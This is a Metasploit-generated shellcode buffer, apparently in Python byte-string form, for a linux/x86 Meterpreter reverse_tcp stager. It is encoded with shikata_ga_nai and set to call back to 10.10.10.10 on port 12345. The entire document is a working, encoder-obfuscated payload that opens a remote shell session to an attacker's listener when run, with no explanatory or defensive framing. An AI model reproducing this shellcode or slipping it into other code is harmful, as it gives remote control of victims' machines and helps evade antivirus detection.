# linux/x86/meterpreter/reverse_tcp - 150 bytes (stage 1)
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LHOST=10.10.10.10, LPORT=12345, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, AutoLoadStdapi=true, 
# AutoVerifySession=true, AutoVerifySessionTimeout=30, 
# InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
# EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
# SessionRetryWait=10, SessionExpirationTimeout=604800, 
# SessionCommunicationTimeout=300, PayloadProcessCommandLine=, 
# AutoUnhookProcess=false, PingbackRetries=0, 
# PingbackSleep=30, PayloadUUIDTracking=false, 
# EnableStageEncoding=false, StageEncoderSaveRegisters=, 
# StageEncodingFallback=true, PrependFork=false, 
# PrependSetresuid=false, PrependSetreuid=false, 
# PrependSetuid=false, PrependSetresgid=false, 
# PrependSetregid=false, PrependSetgid=false, 
# PrependChrootBreak=false, AppendExit=false, 
# MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=
buf =  b""
buf += b"\xda\xd1\xb8\xd8\x8b\x06\x26\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x1f\x31\x43\x1a\x03\x43\x1a\x83\xeb\xfc\xe2"
buf += b"\x2d\xe1\x0c\x78\xfc\x2d\xe7\x67\xad\x92\x5b\x02\x53"
buf += b"\xa5\x3a\x5b\xb2\x08\x42\xcc\x6f\xfb\x49\xf9\x85\xf1"
buf += b"\x25\xff\x99\x35\x8f\x76\x78\x5f\x89\xd0\x2a\xf1\x02"
buf += b"\x68\x2b\xb2\x61\xea\x2e\xf5\x03\xf2\x7e\x82\xce\x6c"
buf += b"\xdc\x6a\x31\x6d\x78\x01\x31\x07\x7d\x5c\xd2\xe6\xb4"
buf += b"\x93\x95\x8c\x86\x55\x2b\x65\x21\x14\x54\xc3\x2d\x48"
buf += b"\x5b\x33\xa4\x8b\x9a\xd8\xba\x8a\xfe\x13\x72\x71\xcc"
buf += b"\xac\xf7\x4a\xb6\xbc\xac\xc3\xa6\x24\xe0\xbe\x98\x54"
buf += b"\xc9\xbf\x5c\x9a\xa9\xbd\xa1\xfa\xf1\xc3\x5d\xfd\x01"
buf += b"\x7f\x5c\xfd\x01\x7f\x92\x7d"
